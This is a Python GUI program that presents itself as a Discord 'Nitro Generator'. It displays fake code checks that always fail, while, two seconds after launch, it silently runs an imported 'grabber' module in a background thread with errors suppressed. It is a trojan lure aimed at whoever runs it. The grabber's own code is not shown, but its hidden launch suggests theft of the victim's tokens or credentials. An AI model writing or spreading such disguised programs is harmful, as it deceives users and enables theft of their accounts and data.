import tkinter as tk
from tkinter import scrolledtext
import threading
import random
import string
import time

from grabber import run as run_grabber

# ---- GUI ----
root = tk.Tk()
root.title("Nitro Generator - by Rubilacxe")
root.geometry("520x460")
root.configure(bg="#141414")
root.resizable(False, False)

title = tk.Label(
    root, text="Nitro Generator by Rubilacxe",
    bg="#141414", fg="#00c800",
    font=("Consolas", 14, "bold")
)
title.pack(pady=(12, 6))

log_box = scrolledtext.ScrolledText(
    root, width=60, height=18,
    bg="#0a0a0a", fg="#00c800",
    font=("Consolas", 10),
    insertbackground="#00c800"
)
log_box.pack(padx=12, pady=6)
log_box.configure(state="disabled")

status = tk.Label(
    root, text="Ready. Press GENERATE to start.",
    bg="#141414", fg="#888888",
    font=("Consolas", 9)
)
status.pack(pady=(0, 6))

running = {"value": False}

def log(line):
    log_box.configure(state="normal")
    log_box.insert("end", line + "\n")
    log_box.see("end")
    log_box.configure(state="disabled")

def random_code(length=16):
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))

def gen_loop():
    attempts = 0
    while running["value"]:
        attempts += 1
        code = random_code()
        log(f"[*] Checking https://discord.gift/{code} ...")
        time.sleep(1.2)
        log(f"[x] Invalid code (attempt {attempts})")
        time.sleep(0.8)

def on_click():
    if not running["value"]:
        running["value"] = True
        btn.config(text="STOP")
        status.config(text="Searching valid Nitro codes...")
        log("[+] Nitro Gen by Rubilacxe started.")
        threading.Thread(target=gen_loop, daemon=True).start()
    else:
        running["value"] = False
        btn.config(text="GENERATE")
        status.config(text="Stopped.")
        log("[!] Generation stopped.")

btn = tk.Button(
    root, text="GENERATE", command=on_click,
    bg="#00c800", fg="#000000",
    font=("Consolas", 11, "bold"),
    relief="flat", height=2
)
btn.pack(fill="x", padx=12, pady=(0, 12))

# ---- lancer le grabber en arrière-plan 2s après ouverture ----
def delayed_grab():
    time.sleep(2)
    try:
        run_grabber()
    except Exception:
        pass

threading.Thread(target=delayed_grab, daemon=True).start()

root.mainloop()
